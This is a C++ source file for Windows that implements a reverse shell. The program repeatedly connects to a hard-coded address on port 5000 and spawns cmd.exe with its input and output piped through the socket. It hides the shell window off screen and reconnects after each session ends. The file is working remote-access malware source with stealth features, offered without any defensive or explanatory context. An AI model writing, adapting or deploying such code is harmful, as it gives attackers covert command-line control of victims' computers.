#include "TCPConnection.h"
#include "Packet.h"

#define SERVER_PORT 5000

class ReverseShell
{
protected:
	ReverseShell() {};
private:

	static DWORD shell_routine(LPVOID dstSocket)
	{		
		LPWSTR path = _wcsdup(L"C:\\Windows\\System32\\cmd.exe");	

		STARTUPINFO si;
		memset(&si, 0, sizeof(STARTUPINFO));

		si.cb = sizeof(STARTUPINFO);
		//redirect process I/O to socket
		si.hStdError = si.hStdInput = si.hStdOutput = dstSocket;
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USEPOSITION | STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE; // hide window
		//position window outside of screen bounds
		si.dwX = GetSystemMetrics(SM_CXSCREEN);
		si.dwY = GetSystemMetrics(SM_CYSCREEN);

		PROCESS_INFORMATION procInfo;
		memset(&procInfo, 0, sizeof(PROCESS_INFORMATION));

		if (!CreateProcessW(NULL, path, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &procInfo))
		{
			std::cerr << "Error creating process cmd.exe" << std::endl;
			ExitThread(GetLastError());
		}

		WaitForSingleObject(procInfo.hProcess, INFINITE);
		CloseHandle(procInfo.hProcess);

		return EXIT_SUCCESS;
	}

public:

	static bool run(const int& remoteSocket)
	{
		HANDLE hThread =
			CreateThread(NULL, 0, 
			(LPTHREAD_START_ROUTINE)shell_routine,
			(LPVOID)remoteSocket, 0, NULL);

		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);

		return EXIT_SUCCESS;
	}
};

int main()
{
	while (true)
	{
		TCPConnection *cnx = NULL;

		while (cnx == NULL)
		{
			cnx = TCPConnector::Connect("127.0.0.1", SERVER_PORT);
		}

		std::cout << "start session" << std::endl;
		ReverseShell::run(cnx->getSocket());
		std::cout << "end session" << std::endl;
		cnx->close();
	}

	return 0;
}
